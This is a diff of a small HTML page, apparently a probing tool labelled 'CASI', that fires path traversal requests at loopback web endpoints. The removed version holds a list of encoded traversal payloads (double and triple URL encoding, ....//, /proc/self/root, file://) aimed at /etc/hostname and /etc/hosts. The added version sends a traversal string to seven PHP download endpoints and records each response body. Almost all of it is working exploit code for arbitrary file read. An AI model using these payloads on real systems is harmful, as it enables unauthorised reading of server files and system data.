@@ -1,16 +1,11 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI traversal normalization v25</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>Sibling file normalization results</h1><div id="o"></div><script>
-const b='http://127.0.0.1:8080',t=[
-['raw-d8','/file?name=../../../../../../../../etc/hostname'],
-['double-d8','/file?name=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhostname'],
-['double-abs','/file?name=%252Fetc%252Fhostname'],
-['triple-d4','/file?name=..%25252F..%25252F..%25252F..%25252Fetc%25252Fhostname'],
-['dot4','/file?name=....%2F....%2F....%2F....%2Fetc%2Fhostname'],
-['proc1','/file?name=%2Fproc%2F1%2Froot%2Fetc%2Fhostname'],
-['procself','/file?name=%2Fproc%2Fself%2Froot%2Fetc%2Fhostname'],
-['file-uri','/file?name=file%3A%2F%2F%2Fetc%2Fhostname'],
-['path-d8','/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname'],
-['path-enc','/file/%252e%252e%252f%252e%252e%252fetc%252fhostname'],
-['filename','/file?filename=%2Fetc%2Fhostname'],
-['hosts-double','/file?name=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhosts']];
-(async()=>{await Promise.all(t.map(async([l,u])=>{let s='';const c=new AbortController(),q=setTimeout(()=>c.abort(),7000);try{const r=await fetch(b+u,{cache:'no-store',signal:c.signal});const x=await r.text();s=l+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' BODY='+JSON.stringify(x.slice(0,800));}catch(e){s=l+' ERROR='+e.name+':'+e.message}clearTimeout(q);const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}))})();
+<!doctype html><html><head><meta charset="utf-8"><title>CASI loopback download APIs v26</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>Loopback download API results</h1><div id="o"></div><script>
+const r='../../../../../../../../etc/hostname',e=encodeURIComponent(r),b='https://127.0.0.1',t=[
+['ico','/backend/ico.php?ico='+e],
+['gpx','/backend/ax/get_gpx_file.php?track_id='+e],
+['media','/backend/ax/get_media.php?cmd=downloadDDD&name='+e+'&agent_id=0'],
+['photo','/backend/ax/drivers.php?cmd=photo&id='+e],
+['vehfile','/backend/ax/veh/files.php?cmd=download&owner=vehicle&owner_id=0&id='+e],
+['atom','/backend/ax/mod/atom/file_download.php?id='+e],
+['report','/backend/get_report.php?id='+e+'&ext=&name=x']];
+(async()=>{await Promise.all(t.map(async([l,u])=>{let s='';const c=new AbortController(),q=setTimeout(()=>c.abort(),8000);try{const x=await fetch(b+u,{cache:'no-store',signal:c.signal});const y=await x.text();s=l+' STATUS='+x.status+' TYPE='+x.headers.get('content-type')+' DISP='+x.headers.get('content-disposition')+' BODY='+JSON.stringify(y.slice(0,1000));}catch(e){s=l+' ERROR='+e.name+':'+e.message}clearTimeout(q);const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}))})();
 </script></body></html>
